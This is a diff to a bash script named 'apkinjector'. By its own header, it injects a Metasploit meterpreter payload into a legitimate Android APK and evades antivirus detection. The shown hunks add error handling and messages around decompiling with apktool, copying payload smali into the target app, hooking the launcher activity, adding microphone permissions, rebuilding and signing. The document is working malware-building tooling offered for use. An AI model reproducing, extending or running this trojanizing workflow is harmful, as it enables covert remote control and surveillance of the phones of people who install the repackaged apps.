@@ -1,8 +1,9 @@
 #!/bin/bash
 
 # Author: Justin Breed
+# Filename: apkinjector
 # Purpose: AV Evasion along with injecting a meterpreter payload into another apk file
-# Date: 0% detection as of 16Feb17
+# AV Bypass: 0% detection as of 16Feb17
 
 if [ $# -lt 2 ] || [ ${1: -4} != ".apk" ] || [ ${2: -4} != ".apk" ]; then
     echo
@@ -14,9 +15,10 @@ if [ $# -lt 2 ] || [ ${1: -4} != ".apk" ] || [ ${2: -4} != ".apk" ]; then
     exit 1
 fi
 
-#Checking dependencies
+#Checking if apktool is available. If not, it will handle obtaining it and moving it to the user's path.
 type apktool.jar >/dev/null 2>&1 || { 
-   echo "ApkTool depenency needed... downloading"
+   echo -e "\033[34m ApkTool dependency needed... downloading \x1B[0m"
+   echo;
    wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.2.2.jar
    mv apktool_2.2.2.jar apktool.jar
    chmod +x apktool.jar
@@ -55,11 +57,11 @@ cp -r /tmp/payload/smali/com/$VAR1 /tmp/original/smali/com/.
 
 #locate the launcher smali
 cat /tmp/original/AndroidManifest.xml | grep @string/app_name | grep android:name=\"com. | grep \<activity\ android: > /tmp/output
-grep -oP 'com.*." ' /tmp/output > /tmp/output_1 	# breaks apart the com object
-sed -i 's#"##' /tmp/output_1  			            # gets rid of the “
-sed -i 's/\./\//g' /tmp/output_1                    # Replaces all "." with "/"
+grep -oP 'com.*." ' /tmp/output | awk 'NR==1{print $1}' > /tmp/output_1 	# breaks apart the com object
+sed -i 's#"##' /tmp/output_1  			        # gets rid of the “
+sed -i 's/\./\//g' /tmp/output_1                        # Replaces all "." with "/"
 sed -i 's/[ \t]*$//' /tmp/output_1                  
-launcherSmali=`cat /tmp/output_1`.smali             # Stores the result as a variable and appends ".smali"
+launcherSmali=`cat /tmp/output_1`.smali                 # Stores the result as a variable and appends ".smali"
 if [ \! -s /tmp/output_1 ]; then 
     echo; echo
     echo "Running grep -B 7 -A 2 MAIN /tmp/original/AndroidManifest.xml"
@@ -74,6 +76,9 @@ if [ \! -s /tmp/output_1 ]; then
     echo
     echo "Example: com/path1/path2/MainActivity.smali"
     read -p 'Location of MAIN/LAUNCHER .smali file: ' launcherSmali
+    if [ ! -f /tmp/original/smali/$launcherSmali ]; then
+        echo -e "\033[31m Was unable to locate the .smali file. Please verify the path manually to the .smali file is present in the /tmp/original/smali directory. Also, be sure to include the .smali file extension in the prompt.\x1B[0m"
+    fi
 else
     echo -e "\033[32m Found smali launcher in AndroidManifest.xml: $launcherSmali \x1B[0m"
 fi
@@ -113,10 +118,23 @@ sed -i "/SET_WALLPAPER/a<uses-feature android:name=\"android.hardware.microphone
 #Rebuild the package using APKTool
 java -jar $JAR b /tmp/original
 echo; 
-echo -e "\033[34m Injected package created: `pwd`/injected_$originalApk \x1B[0m"
-echo -e "\033[34m Moving package to the current directory \x1B[0m"
-mv /tmp/original/dist/$originalApk injected_$originalApk
+echo -e "\033[34m Verifying ApkTool was able to compile the modified original package. \x1B[0m"
 echo
+
+#Check if the injected file was successful in being created
+if [ ! -f /tmp/original/dist/$originalApk ]; then
+    echo -e "\033[31m There was a problem in the creation of the injected APK file. Review the output to see where the issue was. Also, review /tmp/original files to see what could have potentially caused APKTool to fail.\x1B[0m"
+    rm -rf /tmp/payload
+    #rm -rf /tmp/original
+    rm /tmp/output
+    rm /tmp/output_1
+    exit 1
+fi
+
+#Rename and move the injected file to the current working directory
+echo -e "\033[34m Injected package created: `pwd`/injected_$originalApk \x1B[0m"
+echo -e "\033[34m Moving the injected package to the current directory \x1B[0m"
+mv /tmp/original/dist/$originalApk injected_$originalApk
 
 #Signing the package
 echo -e "\033[34m Checking for ~/.android/debug.keystore for signing \x1B[0m"
